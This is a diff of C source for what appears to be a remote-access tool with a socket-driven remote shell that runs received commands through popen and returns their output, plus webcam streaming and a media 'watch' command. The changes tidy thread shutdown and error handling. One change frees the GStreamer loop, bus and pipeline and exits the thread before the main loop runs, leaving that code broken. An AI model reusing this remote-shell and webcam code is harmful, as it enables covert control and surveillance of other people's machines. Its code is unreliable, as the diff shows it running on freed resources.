@@ -361,6 +361,8 @@ void dispatch_modules(char *argv[])
 
                 return;
             }
+
+            pthread_cancel(stream_webcam_thread);
             //get_remote_screen_resolution();
         }
 
@@ -831,14 +833,22 @@ void *start_remote_shell(char *argv[])
             buffer[data_len - 1] = '\0';
 
             if(strncmp(buffer, "quit", 4) == 0)
-                break;
+            {
+                memset(buffer_cmd, 0, MAXDATASIZE);
+                memset(buffer, 0, BUFSIZ);
 
+                shutdown(csock, SHUT_RDWR);
+                pthread_exit(NULL);
+            }
+
+            /*
             pipe[0] = popen(buffer, "w");
             if(pipe[0] == NULL)
             {
                 error("popen() pipe[0]", "start_remote_shell()");
                 return;
             }
+            */
 
             /* Send command results */
             pipe[1] =  popen(buffer, "r");
@@ -865,11 +875,13 @@ void *start_remote_shell(char *argv[])
             memset(buffer_cmd, 0, MAXDATASIZE);
             memset(buffer, 0, BUFSIZ);
 
+            /*
             if(pclose(pipe[0]) == -1)
             {
                 error("pclose() pipe[0]", "start_remote_shell()");
                 return;
             }
+            */
 
             if(pclose(pipe[1]) == -1)
             {
@@ -879,12 +891,7 @@ void *start_remote_shell(char *argv[])
         }
     }
 
-    memset(buffer_cmd, 0, MAXDATASIZE);
-    memset(buffer, 0, BUFSIZ);
-
-    printf("\n\nthread fermé\n\n");
-
-    pthread_exit(NULL);
+    return;
 }
 
 
@@ -902,20 +909,20 @@ void execute_watch_cmd()
     if(recv(csock, (char*)&len_watch_cmd, sizeof(len_watch_cmd), 0) == SOCKET_ERROR)
     {
         error("recv() len_watch_cmd", "execute_watch_cmd()");
-        exit(-1);
+        return;
     }
 
     buffer = malloc(len_watch_cmd * sizeof(char));
     if(buffer == NULL)
     {
         error("malloc() buffer", "execute_watch_cmd()");
-        exit(-1);
+         return;
     }
 
     if(recv(csock, buffer, len_watch_cmd, 0) == SOCKET_ERROR)
     {
         error("recv() buffer", "execute_watch_cmd()");
-        exit(-1);
+        return;
     }
 
      /* Initialize our data structure */
@@ -932,7 +939,7 @@ void execute_watch_cmd()
     {
         g_printerr ("Unable to set the pipeline to the playing state.\n");
         gst_object_unref (pipeline);
-        exit(-1);
+        return;
     }
 
     else if(ret == GST_STATE_CHANGE_NO_PREROLL)
@@ -947,17 +954,25 @@ void execute_watch_cmd()
     gst_bus_add_signal_watch (bus);
     g_signal_connect(bus, "message", G_CALLBACK(cb_message), &data);
 
+    free(buffer);
+    g_main_loop_unref (main_loop);
+    gst_object_unref (bus);
+    //gst_element_set_state (pipeline, GST_STATE_NULL);
+    gst_object_unref (pipeline);
+
     pthread_exit(NULL);
 
     g_main_loop_run(main_loop);
 
-    /* Free resources */
+    /* Free resources
     g_main_loop_unref (main_loop);
     gst_object_unref (bus);
     gst_element_set_state (pipeline, GST_STATE_NULL);
     gst_object_unref (pipeline);
 
     free(buffer);
+
+    */
 
 }
 
